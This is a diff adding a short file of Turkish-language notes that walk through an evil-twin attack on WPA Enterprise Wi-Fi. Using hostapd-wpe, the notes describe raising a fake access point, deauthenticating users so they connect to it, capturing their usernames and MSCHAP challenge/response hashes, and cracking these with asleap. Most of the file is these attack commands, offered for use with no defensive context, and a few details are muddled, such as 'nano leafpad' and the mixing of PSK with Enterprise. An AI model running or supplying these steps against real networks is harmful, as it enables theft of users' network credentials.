@@ -1,0 +1,15 @@
+#wpa enterprise psk sifrelemede her kullanici kendine ait bir key kullanir arka planda bir radius sunucu yapilandirilir.
+#radius sunucuya bi request gonderilir radius sunucu challenge response doner
+
+
+#biz cakma bir wpa enterprise agi yaratiyoruz ve kisiden kullanici adini ve radius sunucuya gelen challenge ve ntlm response keyleri yakalayip kiriyoruz.
+
+apt-get install hostapd-wpe // indiriyoruz
+nano leafpad /etc/hostapd-wpe/hostapd-wpe.conf #burada wifi aginin adini vs duzenliyoruz
+service network-manager stop 
+hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf #wifi yi ayaga kaldiriyoruz
+
+asleap -C <challengehashi> -R <responsehashi> -w <hazirladigimizhash> #yukarida yarattigimiz cakma wifi diger wifi deauth duzenliyoruz boylece 
+kullaniciyi buna baglanmaya zorluyoruz bu sirada kullanici adin ve challenge ve response yakaliyoruz.
+
+
